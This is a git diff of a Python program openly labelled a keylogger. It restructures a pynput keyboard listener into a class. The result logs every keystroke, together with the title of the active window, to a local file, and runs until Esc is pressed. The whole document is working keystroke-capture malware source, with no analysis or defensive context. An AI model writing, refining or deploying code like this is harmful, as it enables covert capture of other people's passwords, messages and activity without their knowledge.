@@ -3,44 +3,63 @@ from pynput.keyboard import Key, Listener
 import logging
 
 from win32gui import GetWindowText, GetForegroundWindow
-GetWindowText(GetForegroundWindow())
 
-logger = logging.getLogger("Shithead")
+logging.basicConfig(filename='YoYo.log', filemode='w', level=logging.INFO)
+logger = logging.getLogger("My Keylogger")
+logger.setLevel(logging.INFO)
 count=0
 keys=[]
-lastactivewindow=GetWindowText(GetForegroundWindow())
-if lastactivewindow[0]=='●':
-        lastactivewindow=lastactivewindow[2:]
 
-splitterCount= lastactivewindow.count('-')
-if lastactivewindow.count('-')==0:
-    lastApp=lastactivewindow
-else:
-    lastApp=lastactivewindow.split('-')[splitterCount]
+class keylogger():
+    def __init__(self):
+        global logger
+        self.lastApp,self.lastactivewindow = self.getActiveWindow()
+        logger.info(self.lastactivewindow)
+        self.currentApp,self.currentactivewindow = None,None
 
-def on_press(key):
-    global keys,count,lastactivewindow,lastApp,logger
-    currentactiveMenu=GetWindowText(GetForegroundWindow())
-    if currentactiveMenu[0]=='●':
-        currentactiveMenu=currentactiveMenu[2:]
 
-    if currentactiveMenu!=lastactivewindow:
-        print(currentactiveMenu)
-        print("-"*50)
-        lastactivewindow=currentactiveMenu
+    def getActiveWindow(self):
+        lastactivewindow=GetWindowText(GetForegroundWindow())
+        if lastactivewindow[0]=='●':
+                lastactivewindow=lastactivewindow[2:]
 
-    print("{0}pressed".format(key)) 
+        splitterCount= lastactivewindow.count('-')
+        if lastactivewindow.count('-')==0:
+            lastApp=lastactivewindow
+        else:
+            lastApp=lastactivewindow.split('-')[splitterCount]
+        return lastApp,lastactivewindow
 
-def write_file(keys):
-    with open("log.txt", "a") as f:
-        for key in keys:
-            f.write(key)
-
-def on_release(key):
-    if key== Key.esc:
-        return False
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    def checkCurrentWindow(self):
+        if self.currentactivewindow!=self.lastactivewindow:
+            logger.info(self.currentactivewindow)
+            logger.info("-"*50)
+            self.lastactivewindow=self.currentactivewindow
 
     
+    def on_press(self,key):
+        global keys,count,logger
+        self.currentApp,self.currentactivewindow=self.getActiveWindow()
+        self.checkCurrentWindow()
+        
+        logger.info("{0}pressed".format(key)) 
+
+    def write_file(self,keys):
+        with open("log.txt", "a") as f:
+            for key in keys:
+                f.write(key) 
+
+    def on_release(self,key):
+        if key== Key.esc:
+            return False
+    
+    def start(self):
+
+        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            listener.join() 
+
+if __name__=="__main__":
+    keylog=keylogger()
+    keylog.start()
+
+
